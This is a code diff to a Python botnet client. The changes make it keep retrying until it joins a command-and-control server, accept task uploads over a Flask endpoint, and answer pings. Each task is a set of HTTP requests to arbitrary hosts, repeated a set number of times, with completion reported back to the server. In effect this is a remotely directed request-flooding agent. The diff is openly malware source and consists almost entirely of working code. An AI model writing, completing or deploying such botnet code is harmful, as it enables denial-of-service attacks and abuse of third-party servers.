@@ -13,8 +13,8 @@ lock = threading.Lock()
 PORT = "4600"
 SERVER_IP = "localhost:80"
 VERSION = "0.0.1"
-
 ID = ""
+CONNECTED = False
 
 ####################################
 # Performing Tasks
@@ -26,13 +26,14 @@ class HTTPRequestStruct:
         self.path = path
         self.headers = headers
         self.body = body
-    def do_request():
+    def do_request(self):
         if self.method == "GET":
             if self.path[0] != "/":
-                r = requests.get(self.host + "/" + self.path)
+                r = requests.get(self.host + "/" + self.path, headers=self.headers)
                 return r.status_code, r.headers, r.text
             else:
-                r = requests.get(self.host + self.path)
+                r = requests.get(self.host + self.path, headers=self.headers)
+                print(r.text)
                 return r.status_code, r.headers, r.text
         elif self.method == "POST":
             if self.path[0] != "/":
@@ -57,9 +58,12 @@ class Task:
         #This is the ID for the task
         self.id = 0
 
+        # This indicates how many times we do the task
+        self.times = 1
+
         # Parse the json
         tasks_loaded = json.loads(self.raw_task)
-        for request in tasks_loaded["Requests"]:
+        for request in tasks_loaded:
             method = request["Method"]
             host = request["Host"]
             path = request["Path"]
@@ -68,10 +72,12 @@ class Task:
             http_request_deserialized = HTTPRequestStruct(method, host, path, headers, body)
             self.http_requests.append(http_request_deserialized)
     def do_task(self):
-        for request in self.http_requests:
-            request.do_request()
-        requests.post("http://" + SERVER_IP + "/done", data={"Type":"DONE", "ID": ID, 
-            "Message":str(self.id), "MessageBinary":"", "Version":VERSION})
+        for x in range(self.times):
+            for request in self.http_requests:
+                request.do_request()
+            global ID
+            requests.post("http://" + SERVER_IP + "/done", data={"Type":"DONE", "ID": ID, 
+                "Message":str(self.id), "MessageBinary":"", "Version":VERSION})
 
 class TaskManager(Task):
     def __init__(self):
@@ -82,29 +88,30 @@ class TaskManager(Task):
         lock.release()
     def do_tasks(self):
         while True:
-            if len(self.tasks) > 0:
-                for x in range(len(self.tasks)):
-                    self.tasks[x].do_task() # @BUG: concurrency issue here probably
-                    lock.acquire()
-                    del self.tasks[x]
-                    lock.release()
+            for x in range(len(self.tasks)):
+                self.tasks[x].do_task() # @BUG: concurrency issue here probably
+                lock.acquire()
+                del self.tasks[x]
+                lock.release()
             time.sleep(0.1)
 
 task_manager = TaskManager()
 
 def task_subroutine():
-    threading.Thread(target=task_manager.do_tasks()).start()
+    t_id = threading.Thread(target=task_manager.do_tasks, args=[])
+    t_id.start()
 
 ####################################
 # Server (on port PORT)
 ####################################
-@app.route("/")
+@app.route("/", methods=["GET", "POST"])
 def Index():
     return "Hello, world!"
 
-@app.route("/uploadtask")
+@app.route("/uploadtask", methods=["GET", "POST"])
 def UploadTask():
     if request.method == "POST":
+        print("incoming task!")
         # Parse the request
         r_Type = request.form["Type"]
         r_ID = request.form["ID"]
@@ -118,17 +125,19 @@ def UploadTask():
 
         # return okay so we can be done with the connection
         return "Okay"
-        
 
-@app.route("/ping")
+@app.route("/ping", methods=["GET", "POST"])
 def Ping():
-    # @TODO
-    pass
-
-@app.route("/pong")
-def Pong():
-    # @TODO
-    pass
+    global ID
+    response = {
+        "Type": "PONG",
+        "ID":ID,
+        "Message":"",
+        "MessageBinary":"",
+        "Version":VERSION,
+    }
+    response_json = json.dumps(response)
+    return response_json
 
 ############################################
 # Functions to interact with botnet server
@@ -149,10 +158,23 @@ def join_botnet():
         pass
     else:
         print("[*] Successfully joined botnet!")
+        global ID
         ID = resp_message
         print("\tID: {}".format(ID))
+        return True
+    return False
+
+def auto_join_botnet_subroutine():
+    joined = False
+    while True:
+        joined = join_botnet()
+        global CONNECTED
+        CONNECTED = joined
+        if CONNECTED == True:
+            break
 
 def disconnect():
+    global ID
     response = requests.post("http://" + SERVER_IP + "/disconnect", data={
         "Type":"DISCONNECT",
         "ID":ID,
@@ -168,12 +190,11 @@ def sigint_handler(sig, frame):
     print("[*] Intercepted sigint!")
     print("\tGracefully quitting!")
     disconnect()
-    sys.exit(0)
-
+    quit()
 
 
 if __name__ == "__main__":
     signal.signal(signal.SIGINT, sigint_handler)
-    join_botnet()
+    auto_join_botnet_subroutine()
     task_subroutine()
     app.run(debug=False, port=PORT)
